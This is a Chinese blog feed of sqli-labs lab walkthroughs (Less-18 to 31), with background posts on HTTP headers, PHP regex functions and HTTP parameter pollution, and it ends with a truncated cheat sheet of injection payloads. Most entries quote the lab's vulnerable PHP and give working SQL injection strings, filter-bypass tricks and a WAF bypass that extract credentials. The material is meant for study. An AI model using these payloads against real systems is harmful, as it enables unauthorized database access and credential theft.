        <content type="html"><![CDATA[<h3 id="介绍preg-match-函数：-https-www-runoob-com-php-php-preg-match-html"><a href="#介绍preg-match-函数：-https-www-runoob-com-php-php-preg-match-html" class="headerlink" title="介绍preg_match()函数：(https://www.runoob.com/php/php-preg_match.html)"></a>介绍preg_match()函数：(<a href="https://www.runoob.com/php/php-preg_match.html">https://www.runoob.com/php/php-preg_match.html</a>)</h3><p>preg_match 函数用于执行一个正则表达式匹配。</p><h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><pre><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</code></pre><p>搜索 subject 与 pattern 给定的正则表达式的一个匹配。</p><p>参数说明：</p><ul><li>$pattern: 要搜索的模式，字符串形式。</li><li>$subject: 输入字符串。</li><li>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</li><li>$flags：flags 可以被设置为以下标记值：<ol><li>PREG_OFFSET_CAPTURE:  如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</li></ol></li><li>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</li></ul><h5 id="返回值："><a href="#返回值：" class="headerlink" title="返回值："></a>返回值：</h5><p>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后  将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回  FALSE。</p><h3 id="Less-29："><a href="#Less-29：" class="headerlink" title="Less-29："></a>Less-29：</h3><p>源码中SQL语句如下：</p><pre><code>$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre><p>使用前面的注入方法进行注入：</p><pre><code>login.php?id=-1' union select 1,database(),3--+</code></pre><p>源码：</p><pre><code>function whitelist($input){    $match = preg_match("/^\d+$/", $input); //这个正则表达式 意思是 匹配 以数字开头的一个或多个数字且以数字结尾的字符串。    if($match)    {        //echo "you are good";        //return $match;    }    else    {            header('Location: hacked.php');        //echo "you are bad";    }}</code></pre><p>然后，我们发现input就是id1,id1来自于java,implimentation</p><p>(qs)</p><pre><code>$qs = $_SERVER['QUERY_STRING']; //获取查询语句，获取的是URL中?后面的值$id1=java_implimentation($qs);$id=$_GET['id'];whitelist($id1);</code></pre><p>接着，查看java_implimentation()方法，发现这个方法是用来模拟HPP的，意思就是说这个方法存在HPP漏洞我们可以利用。</p><pre><code>// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).//当受到HPP（HTTP参数污染）的影响时，以下功能可模仿参数的行为。function java_implimentation($query_string){    $q_s = $query_string;    $qs_array= explode("&amp;",$q_s); //根据&amp;分割字符串并打散为数组    foreach($qs_array as $key =&gt; $value)    {        $val=substr($value,0,2);        if($val=="id")        {            $id_value=substr($value,3,30);             return $id_value;            echo "&lt;br&gt;";            break;        }    }}</code></pre><p>所以可以构造payload：</p><pre><code>login.php?id=1&amp;id=-1' union select 1,database(),3--+</code></pre><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30:"></a>Less-30:</h3><p>less-30的SQL语句为：</p><pre><code>$id=$_GET['id'];$id = '"' .$id. '"';$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</code></pre><p>仅仅只添加了“注释</p><p>因此直接构造payload为：</p><pre><code>login.php?id=1&amp;id=-1" union select 1,database(),3--+</code></pre><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31:"></a>Less-31:</h3><p>less-31的SQL语句为：</p><pre><code>$id=$_GET['id'];$id = '"' .$id. '"';$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";</code></pre><p>添加注释（）因此payload为：</p><pre><code>login.php?id=1&amp;id=-1") union select 1,database(),3--+</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:background-6:服务器两层架构介绍</title>
      <link href="2021/01/21/sql-background-6-fu-wu-qi-liang-ceng-jia-gou-jie-shao/"/>
      <url>2021/01/21/sql-background-6-fu-wu-qi-liang-ceng-jia-gou-jie-shao/</url>
      
        <content type="html"><![CDATA[<p>服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。工作流程为：client访问服务器，能直接访问到tomcat服务器，然后tomcat服务器再向apache服务器请求数据。数据返回路径则相反。</p><p>此处简单介绍一下相关环境的搭建。环境为ubuntu14.04。此处以我搭建的环境为例，我们需要下载三个东西：tomcat服务器、jdk、mysql-connector-java.分别安装，此处要注意jdk安装后要export环境变量，mysql-connector-java需要将jar文件复制到jdk的相关目录中。接下来将tomcat-files.zip解压到tomcat服务器webapp/ROOT目录下，此处需要说明的是需要修改源代码中正确的路径和mysql用户名密码。到这里我们就可以正常访问29-32关了。（PS：我没有这样做，我还是用的Windows+wamp环境）</p><p>重点：index.php?id=1&amp;id=2，你猜猜到底是显示id=1的数据还是显示id=2的？</p><p>Explain：apache（php）解析最后一个参数，即显示id=2的内容。Tomcat（jsp）解析第一个参数，即显示id=1的内容。</p><p>此处我们想一个问题：index.jsp?id=1&amp;id=2请求，针对第一张图中的服务器配置情况，客户端请求首先过tomcat，tomcat解析第一个参数，接下来tomcat去请求apache（php）服务器，apache解析最后一个参数。那最终返回客户端的应该是哪个参数？</p><p>Answer：此处应该是id=2的内容，应为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache处理的数据。而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在tomcat服务器处做数据过滤和处理，功能类似为一个WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过WAF的检测。该用法就是HPP（HTTP Parameter Pollution），http参数污染攻击的一个应用。HPP可对服务器和客户端都能够造成一定的威胁。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-23-28:绕过注释进行注入</title>
      <link href="2020/12/27/sql-sqlilabs-less-23-28-rao-guo-zhu-shi-fu-guo-lu/"/>
      <url>2020/12/27/sql-sqlilabs-less-23-28-rao-guo-zhu-shi-fu-guo-lu/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍preg-replace-函数："><a href="#介绍preg-replace-函数：" class="headerlink" title="介绍preg_replace() 函数："></a>介绍preg_replace() 函数：</h3><p>preg_replace 函数执行一个正则表达式的搜索和替换。</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><pre><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></pre><p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p><p>参数说明：</p><ul><li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li><li>$replacement: 用于替换的字符串或字符串数组。</li><li>$subject: 要搜索替换的目标字符串或字符串数组。</li><li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li><li>$count: 可选，为替换执行的次数。</li></ul><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。</p><p>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</p><h3 id="less-23-绕过注释符过滤（采用union注入）"><a href="#less-23-绕过注释符过滤（采用union注入）" class="headerlink" title="less-23:绕过注释符过滤（采用union注入）"></a>less-23:绕过注释符过滤（采用union注入）</h3><p>源代码中：</p><pre><code>$reg = "/#/";$reg1 = "/--/";$replace = "";$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre><p>在获取id参数时进行了#，–注释符号的过滤。</p><p>所以构造payload：</p><pre><code>?id=1' union select 1,(select database()),'3</code></pre><pre><code>?id=-1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1</code></pre><p>直接获取字段：</p><pre><code>?id=-1' union select 1,(select group_concat(username,0x3a,password) from users),'3</code></pre><h3 id="less-25-绕过or和and过滤（采用extractvalue-报错注入）"><a href="#less-25-绕过or和and过滤（采用extractvalue-报错注入）" class="headerlink" title="less-25:绕过or和and过滤（采用extractvalue()报错注入）"></a>less-25:绕过or和and过滤（采用extractvalue()报错注入）</h3><p>源代码中：</p><pre><code>function blacklist($id){    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)    $id= preg_replace('/AND/i',"", $id);        //Strip out AND (non case sensitive)    return $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre><p>可见此处对or和and进行了过滤</p><h4 id="绕过or和and过滤，提供以下几种思路："><a href="#绕过or和and过滤，提供以下几种思路：" class="headerlink" title="绕过or和and过滤，提供以下几种思路："></a>绕过or和and过滤，提供以下几种思路：</h4><p>1.大小写变形 Or,OR,oR<br>2.编码，hex，urlencode<br>3.添加注释/<em>or</em>/<br>4.利用符号 and=&amp;&amp;  or=||<br>5.双写or或and绕过</p><p>less-25只能采用方法4.5，所以直接爆字段：</p><pre><code>?id=1' || extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))--+</code></pre><h3 id="less-25a-绕过or和and过滤（采用union注入）"><a href="#less-25a-绕过or和and过滤（采用union注入）" class="headerlink" title="less-25a:绕过or和and过滤（采用union注入）"></a>less-25a:绕过or和and过滤（采用union注入）</h3><p>源代码：</p><pre><code>function blacklist($id){    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)    $id= preg_replace('/AND/i',"", $id);        //Strip out AND (non case sensitive)    return $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</code></pre><p>对于less-25而言less-25a没有‘’包含，和输出错误项，因此不能采用报错注入，因此可采用联合注入和延时注入，直接爆字段：</p><pre><code>?id=-1 union select 1,(select group_concat(id,0x3e,referer,0x3e,ip_address) from referers),2</code></pre><h3 id="less-26：绕过or、and、注释符、空格、斜杠过滤（bigint溢出报错注入）"><a href="#less-26：绕过or、and、注释符、空格、斜杠过滤（bigint溢出报错注入）" class="headerlink" title="less-26：绕过or、and、注释符、空格、斜杠过滤（bigint溢出报错注入）"></a>less-26：绕过or、and、注释符、空格、斜杠过滤（bigint溢出报错注入）</h3><p>源代码：</p><pre><code>function blacklist($id){    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)    $id= preg_replace('/and/i',"", $id);        //Strip out AND (non case sensitive)    $id= preg_replace('/[\/\*]/',"", $id);      //strip out /*    $id= preg_replace('/[--]/',"", $id);        //Strip out --    $id= preg_replace('/[#]/',"", $id);         //Strip out #    $id= preg_replace('/[\s]/',"", $id);        //Strip out spaces    $id= preg_replace('/[\/\\\\]/',"", $id);        //Strip out slashes    return $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";print_r(mysql_error());</code></pre><p>将空格,or,and,/*,#,–,/等各种符号过滤</p><h4 id="关于空格符号的过滤包括以下几种方法："><a href="#关于空格符号的过滤包括以下几种方法：" class="headerlink" title="关于空格符号的过滤包括以下几种方法："></a>关于空格符号的过滤包括以下几种方法：</h4><ol><li>%09 TAB键（水平）</li><li>%0a 新建一行</li><li>%0c 新的一页</li><li>%0d return功能</li><li>%0b TAB键（垂直）</li><li>%a0 空格</li></ol><p>因此直接爆数据库：</p><pre><code>?id=1'%a0union%a0select%a0(!(select%a0*%a0from%a0(select%a0database())x)%a0-%a0~0),2,3%a0||%a0'1</code></pre><pre><code>?id=1'%20union%20select%20(!(select%20*%20from%20(select%20database())x)%20-%20~0),2,3%20||%20'1</code></pre><h3 id="Less-27-绕过union、select等过滤union注入"><a href="#Less-27-绕过union、select等过滤union注入" class="headerlink" title="Less-27 绕过union、select等过滤union注入"></a>Less-27 绕过union、select等过滤union注入</h3><pre><code>function blacklist($id){$id= preg_replace('/[\/\*]/',"", $id);        //strip out /*$id= preg_replace('/[--]/',"", $id);        //Strip out --.$id= preg_replace('/[#]/',"", $id);            //Strip out #.$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.$id= preg_replace('/select/m',"", $id);        //Strip out spaces.$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.$id= preg_replace('/union/s',"", $id);        //Strip out union$id= preg_replace('/select/s',"", $id);        //Strip out select $id= preg_replace('/UNION/s',"", $id);        //Strip out UNION$id= preg_replace('/SELECT/s',"", $id);        //Strip out SELECT$id= preg_replace('/Union/s',"", $id);        //Strip out Union$id= preg_replace('/Select/s',"", $id);        //Strip out selectreturn $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";print_r(mysql_error());</code></pre><h4 id="只需要将union和select改为大小写混合就可以突破。"><a href="#只需要将union和select改为大小写混合就可以突破。" class="headerlink" title="只需要将union和select改为大小写混合就可以突破。"></a>只需要将union和select改为大小写混合就可以突破。</h4><pre><code>?id=100'unIOn%a0seLect%a01,database(),'3</code></pre><h4 id="TIPS：uniunionon也是可以突破限制的。亦可以利用报错注入和延时注入的语法进行注入。"><a href="#TIPS：uniunionon也是可以突破限制的。亦可以利用报错注入和延时注入的语法进行注入。" class="headerlink" title="TIPS：uniunionon也是可以突破限制的。亦可以利用报错注入和延时注入的语法进行注入。"></a>TIPS：uniunionon也是可以突破限制的。亦可以利用报错注入和延时注入的语法进行注入。</h4><h3 id="Less-27a-绕过union、select等过滤union注入"><a href="#Less-27a-绕过union、select等过滤union注入" class="headerlink" title="Less-27a 绕过union、select等过滤union注入"></a>Less-27a 绕过union、select等过滤union注入</h3><pre><code>function blacklist($id){$id= preg_replace('/[\/\*]/',"", $id);        //strip out /*$id= preg_replace('/[--]/',"", $id);        //Strip out --.$id= preg_replace('/[#]/',"", $id);            //Strip out #.$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.$id= preg_replace('/select/m',"", $id);        //Strip out spaces.$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.$id= preg_replace('/union/s',"", $id);        //Strip out union$id= preg_replace('/select/s',"", $id);        //Strip out select$id= preg_replace('/UNION/s',"", $id);        //Strip out UNION$id= preg_replace('/SELECT/s',"", $id);        //Strip out SELECT$id= preg_replace('/Union/s',"", $id);        //Strip out Union$id= preg_replace('/Select/s',"", $id);        //Strip out Selectreturn $id;}$id=$_GET['id'];$id= blacklist($id);$id = '"' .$id. '"';$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";//print_r(mysql_error());</code></pre><pre><code>?id=100"unIOn%a0seLect%a01,database(),"3</code></pre><h4 id="TIPS：这里说下以上payload我们利用最后的3前面的-“-将后面的-“-给闭合掉。或者亦可以利用以前的方法-1-database-3-“1，同时本关可以用延时注入的方法进行注入。"><a href="#TIPS：这里说下以上payload我们利用最后的3前面的-“-将后面的-“-给闭合掉。或者亦可以利用以前的方法-1-database-3-“1，同时本关可以用延时注入的方法进行注入。" class="headerlink" title="TIPS：这里说下以上payload我们利用最后的3前面的 “ 将后面的 “ 给闭合掉。或者亦可以利用以前的方法 1,database(),3 || “1，同时本关可以用延时注入的方法进行注入。"></a>TIPS：这里说下以上payload我们利用最后的3前面的 “ 将后面的 “ 给闭合掉。或者亦可以利用以前的方法 1,database(),3 || “1，同时本关可以用延时注入的方法进行注入。</h4><h3 id="Less-28-绕过union-s-select等过滤-union注入"><a href="#Less-28-绕过union-s-select等过滤-union注入" class="headerlink" title="Less-28 绕过union\s+select等过滤 union注入"></a>Less-28 绕过union\s+select等过滤 union注入</h3><pre><code>function blacklist($id){$id= preg_replace('/[\/\*]/',"", $id);                //strip out /*$id= preg_replace('/[--]/',"", $id);                //Strip out --.$id= preg_replace('/[#]/',"", $id);                    //Strip out #.$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.//$id= preg_replace('/select/m',"", $id);                    //Strip out spaces.$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.$id= preg_replace('/union\s+select/i',"", $id);        //Strip out UNION &amp; SELECT.return $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";//print_r(mysql_error());</code></pre><p>正则表达式’/union\s+select/i’中，\s表示空格，+表示匹配一次或多次，/i表示不区分大小写，所以整体表示匹配 union加一个或多个空格加select，其中union和select不区分大小写。</p><p>所以我们可以将union 和 select中间的空格使用%a替换，我们直接给出一个payload：</p><pre><code>http://127.0.0.1/sql/Less-28/?id=100')union%a0select%a01,database(),3||('1</code></pre><h3 id="Less-28a-绕过union-s-select等过滤-union注入"><a href="#Less-28a-绕过union-s-select等过滤-union注入" class="headerlink" title="Less-28a 绕过union\s+select等过滤 union注入"></a>Less-28a 绕过union\s+select等过滤 union注入</h3><pre><code>function blacklist($id){//$id= preg_replace('/[\/\*]/',"", $id);                //strip out /*//$id= preg_replace('/[--]/',"", $id);                //Strip out --.//$id= preg_replace('/[#]/',"", $id);                    //Strip out #.//$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.//$id= preg_replace('/select/m',"", $id);                    //Strip out spaces.//$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.$id= preg_replace('/union\s+select/i',"", $id);        //Strip out spaces.return $id;}$id=$_GET['id'];$id= blacklist($id);$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";//print_r(mysql_error());</code></pre><pre><code>?id=100')union%a0select 1,database(),3||('1</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-18-22</title>
      <link href="2020/12/17/sql-sqlilabs-less-18-22/"/>
      <url>2020/12/17/sql-sqlilabs-less-18-22/</url>
      
        <content type="html"><![CDATA[<h3 id="十八關中源代碼中："><a href="#十八關中源代碼中：" class="headerlink" title="十八關中源代碼中："></a>十八關中源代碼中：</h3><pre><code>$uname = check_input($_POST['uname']);</code></pre><pre><code>$passwd = check_input($_POST['passwd']);</code></pre><p>对uname和passwd进行了check_input()函数的处理，所以我们在输入uname和passwd上进行注入是不行的，但是在代码中，我们看到了insert()</p><pre><code>$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";</code></pre><p>抓包以后</p><p>将user-agent修改为</p><pre><code>' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1</code></pre><h3 id="十九关的源代码中："><a href="#十九关的源代码中：" class="headerlink" title="十九关的源代码中："></a>十九关的源代码中：</h3><pre><code>$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";</code></pre><p>所以可对referers进行修改：</p><pre><code>1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1</code></pre><h3 id="二十关源代码中："><a href="#二十关源代码中：" class="headerlink" title="二十关源代码中："></a>二十关源代码中：</h3><pre><code>$cookee = $_COOKIE['uname'];$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";</code></pre><p>因此修改cookie为：</p><pre><code>uname=admin' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #</code></pre><h3 id="二十一关源代码中："><a href="#二十一关源代码中：" class="headerlink" title="二十一关源代码中："></a>二十一关源代码中：</h3><pre><code>$cookee = $_COOKIE['uname'];$cookee = base64_decode($cookee);$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";</code></pre><p>可见coookie进行了base64编码处理</p><p>采用base64解码后，修改cookie为：</p><pre><code>uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpLDEpICMg</code></pre><h3 id="二十二关源代码中："><a href="#二十二关源代码中：" class="headerlink" title="二十二关源代码中："></a>二十二关源代码中：</h3><pre><code>$cookee = $_COOKIE['uname'];$cookee = base64_decode($cookee);$cookee1 = '"'. $cookee. '"';$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1";</code></pre><p>可见cookie不只进行了base64处理，还对uname进行了”uname”的处理</p><p>所以修改cookie为：</p><pre><code>uname=YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSAj</code></pre><p>这里只介绍最简单的报错注入。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:background-5:HTTP頭部介紹</title>
      <link href="2020/12/15/sql-background-5-http-tou-bu-jie-shao/"/>
      <url>2020/12/15/sql-background-5-http-tou-bu-jie-shao/</url>
      
        <content type="html"><![CDATA[<p>HTTP头部详解</p><p>1、 Accept：告诉WEB服务器自己接受什么介质类型，*/* 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。</p><p>2、 Accept-Charset： 浏览器申明自己接收的字符集</p><ul><li>Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）</li><li>Accept-Language：浏览器申明自己接收的语言</li><li>语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。</li></ul><p>3、 Accept-Ranges：WEB服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。</p><ul><li>bytes：表示接受</li><li>none：表示不接受。</li></ul><p>4、 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。</p><p>5、 Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB服务器。</p><p>6、 Cache-Control：</p><ul><li>请求：<ul><li>no-cache：（不要缓存的实体，要求现在从WEB服务器去取）</li><li>max-age：（只接受 Age 值小于 max-age 值，并且没有过期的对象）</li><li>max-stale：（可以接受过去的对象，但是过期时间必须小于 max-stale 值）</li><li>min-fresh：（接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象）</li></ul></li><li>响应：<ul><li>public：(可以用 Cached 内容回应任何用户)</li><li>private：（只能用缓存内容回应先前请求该内容的那个用户）</li><li>no-cache：（可以缓存，但是只有在跟WEB服务器验证了其有效后，才能返回给客户端）</li><li>max-age：（本响应包含的对象的过期时间）</li></ul></li><li>ALL:<ul><li>no-store（不允许缓存）</li></ul></li></ul><p>7、 Connection：</p><ul><li>请求：<ul><li>close：（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。</li><li>keepalive：（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。</li></ul></li><li>响应：<ul><li>close：（连接已经关闭）。</li><li>keepalive：（连接保持着，在等待本次连接的后续请求）。</li><li>Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300</li></ul></li></ul><p>8、 Content-Encoding：WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip</p><p>9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。</p><p>10、Content-Length： WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length: 26012</p><p>11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022</p><p>12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml</p><p>13、 ETag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会被修改，所以ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。</p><p>14、 Expired：WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT</p><p>15、 Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn</p><p>16、 If-Match：如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。</p><p>17、If-None-Match：如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。</p><p>18、 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器 该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT</p><p>19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。</p><p>20、 If-Range：浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者 自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一起使用。</p><p>21、 Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT</p><p>22、 Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如：Location：<a href="http://i0.sinaimg.cn/">http://i0.sinaimg.cn</a> /dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</p><p>23、 Pramga：主要使用 Pramga: no-cache，相当于 Cache-Control: no-cache。</p><p>24、 Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</p><p>25、 Range：浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546-</p><p>26、 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer:<a href="http://www.sina.com/">http://www.sina.com/</a></p><p>27、 Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)</p><p>28、 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14</p><p>29、 Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked</p><p>30、 Vary: WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding</p><p>31、 Via： 列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添 加 Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80 (squid/2.6.STABLE13)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:答案（用于破解的语句）</title>
      <link href="2020/12/10/sql-da-an-yong-yu-po-jie-de-yu-ju/"/>
      <url>2020/12/10/sql-da-an-yong-yu-po-jie-de-yu-ju/</url>
      
        <content type="html"><![CDATA[<p>一、联合注入</p><pre><code>?id=-1'union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><pre><code>?id=-1 union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><pre><code>?id=-1') union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><pre><code>?id=-1") union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><p>二、布尔注入</p><pre><code>?id=1 and ascii(substr((select username from users limit 0,1),1,1))&gt;67 --+</code></pre><pre><code>?id=1 and ascii(substr((select password from users limit 0,1),1,1))&gt;67 --+</code></pre><p>一个字符一个字符得出答案<br>三、正则注入（判断)</p><pre><code>id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1) --+</code></pre><p>四、二次查询注入</p><pre><code>?id=1' union SELECT null,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><pre><code>?id=1' union SELECT null,count(*),concat((select password from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>五、报错注入<br>①extractvalue注入</p><pre><code>?id=1' and extractvalue(1,concat(0x23,(select username from users limit 0,1)))--+</code></pre><p>②updatexml注入</p><pre><code>?id=1' and updatexml(1,concat(0x23,(select username from users limit 0,1)),1)--+</code></pre><p>③double溢出注入</p><pre><code>?id=1' union select (exp(~(select * from (select user())a))),2,3--+</code></pre><p>④brgint溢出注入</p><pre><code>?id=1' union select 1,2,3 from (select  name_const(version(),1),name_const(version(),1))x --+</code></pre><p>六、延时注入<br>①sleep()函数</p><pre><code>?id=1'and 